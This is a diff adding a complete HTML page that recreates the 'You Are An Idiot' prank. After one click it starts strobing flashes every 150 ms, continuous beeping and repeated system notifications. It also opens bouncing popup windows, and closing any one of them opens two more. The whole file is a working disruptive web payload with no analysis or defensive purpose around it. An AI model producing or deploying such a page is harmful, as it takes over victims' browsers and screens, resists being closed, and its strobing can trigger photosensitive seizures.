@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>You Are An Idiot</title>
+    <style>
+        body {
+            background-color: white;
+            color: black;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+            font-size: 2rem;
+            font-weight: bold;
+            text-align: center;
+            cursor: pointer;
+            transition: background-color 0.1s;
+            user-select: none;
+        }
+        .flash {
+            background-color: black !important;
+            color: white !important;
+        }
+        /* YouTube-like embed container styling */
+        .embed-container {
+            margin-top: 20px;
+            width: 640px;
+            height: 480px;
+            max-width: 100%;
+            border: 4px solid #333;
+            box-shadow: 0px 10px 25px rgba(0,0,0,0.3);
+            border-radius: 8px;
+            overflow: hidden;
+            display: none; /* Hidden until clicked */
+            background-color: black;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="status-text">CLICK ANYWHERE TO START</div>
+    
+    <!-- YouTube-style iframe embed wrapper -->
+    <div id="video-wrapper" class="embed-container">
+        <iframe src="https://web.archive.org/web/20040924104957/http://www.youareanidiot.org/"></iframe>
+    </div>
+    <div id="notification-box" style="padding: 20px; border: 1px solid #ccc; width: 300px;">
+    Waiting for notifications...
+    </div>
+
+    <script>
+        
+        const messages = [
+    "you are an idiot",
+    "you are an idiot",
+    "you are an idiot",
+    "you are an idiot",
+];
+
+let index = 0;
+const box = document.getElementById("notification-box");
+
+// Function to update the notification
+function showNextNotification() {
+    box.innerHTML = messages[index];
+    
+    // System Notification API Implementation
+    if (Notification.permission === "granted") {
+        new Notification("Alert", {
+            body: messages[index]
+        });
+    }
+    
+    // Increment index and loop back to 0 if at the end
+    index = (index + 1) % messages.length;
+}
+
+// Start the loop (runs every 3 seconds)
+setInterval(showNextNotification, 3000);
+
+        let isStarted = false;
+        let trackedWindows = []; // Array to keep track of active windows
+
+        // 1. Flashing Background Effect
+        setInterval(() => {
+            if (isStarted) {
+                document.body.classList.toggle('flash');
+            }
+        }, 150);
+
+        // 2. Audio Generation using Web Audio API
+        function playIdiotsAudio() {
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            setInterval(() => {
+                let osc = audioCtx.createOscillator();
+                let gain = audioCtx.createGain();
+                osc.type = 'square'; 
+                osc.frequency.setValueAtTime(440, audioCtx.currentTime); 
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.start();
+                gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.2);
+                osc.stop(audioCtx.currentTime + 0.2);
+            }, 300);
+        }
+
+        // 3. Spawning Bouncing Windows with Fullscreen Iframe Payload
+        function spawnWindow() {
+            const screenW = window.screen.availWidth;
+            const screenH = window.screen.availHeight;
+            
+            // Random start position within screen bounds
+            let x = Math.random() * (screenW - 450); 
+            let y = Math.random() * (screenH - 350);
+            
+            // Direction vectors (movement speed)
+            let dx = (Math.random() > 0.5 ? 6 : -6);
+            let dy = (Math.random() > 0.5 ? 6 : -6);
+
+            // Open a child window (Width: 450, Height: 350)
+            let win = window.open("", "_blank", "width=450,height=350,left=" + x + ",top=" + y);
+            
+            if (!win) return; // Popups are currently blocked in your settings
+
+            // Inject the iframe into the child window, stripping margins and scrollbars
+            win.document.write(`
+                <html style='margin:0; padding:0; overflow:hidden; width:100%; height:100%;'>
+                <body style='margin:0; padding:0; overflow:hidden; width:100%; height:100%; background:black;'>
+                    <iframe src="https://web.archive.org/web/20040924104957/http://www.youareanidiot.org/" 
+                            style="width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden;" 
+                            scrolling="no">
+                    </iframe>
+                </body>
+                </html>
+            `);
+            win.document.close(); // Forces the child document to render immediately
+
+            // Save the tracking state of this window reference
+            trackedWindows.push({ ref: win, wasClosed: false });
+
+            // Window bouncing logic loop
+            setInterval(() => {
+                if (win.closed) return;
+                
+                x += dx;
+                y += dy;
+
+                // Wall collisions
+                if (x <= 0 || x >= (screenW - 450)) dx = -dx;
+                if (y <= 0 || y >= (screenH - 350)) dy = -dy;
+
+                win.moveTo(x, y);
+            }, 20);
+        }
+
+        // 4. The Monitoring Loop (Checks if a window was closed)
+        setInterval(() => {
+            if (!isStarted) return;
+
+            for (let i = 0; i < trackedWindows.length; i++) {
+                let winObj = trackedWindows[i];
+
+                // If the window was X'd out and hasn't triggered its spawn chain yet
+                if (winObj.ref.closed && !winObj.wasClosed) {
+                    winObj.wasClosed = true; 
+
+                    // Double the windows!
+                    spawnWindow();
+                    spawnWindow();
+                }
+            }
+        }, 100);
+
+        // Trigger loop activation on user interaction
+        document.body.addEventListener('click', async () => {
+            if (isStarted) return;
+            isStarted = true;
+            
+            // Request System Notification permission on first click
+            if ("Notification" in window) {
+                await Notification.requestPermission();
+            }
+            
+            // Switch landing screen UI elements
+            document.getElementById('status-text').innerText = "YOU ARE AN IDIOT!";
+            document.getElementById('video-wrapper').style.display = "block";
+            
+            playIdiotsAudio();
+            
+            // Spawn initial wave of bouncing windows
+            for(let i = 0; i < 3; i++) {
+                setTimeout(spawnWindow, i * 200);
+            }
+        });
+    </script>
+</body>
+</html>
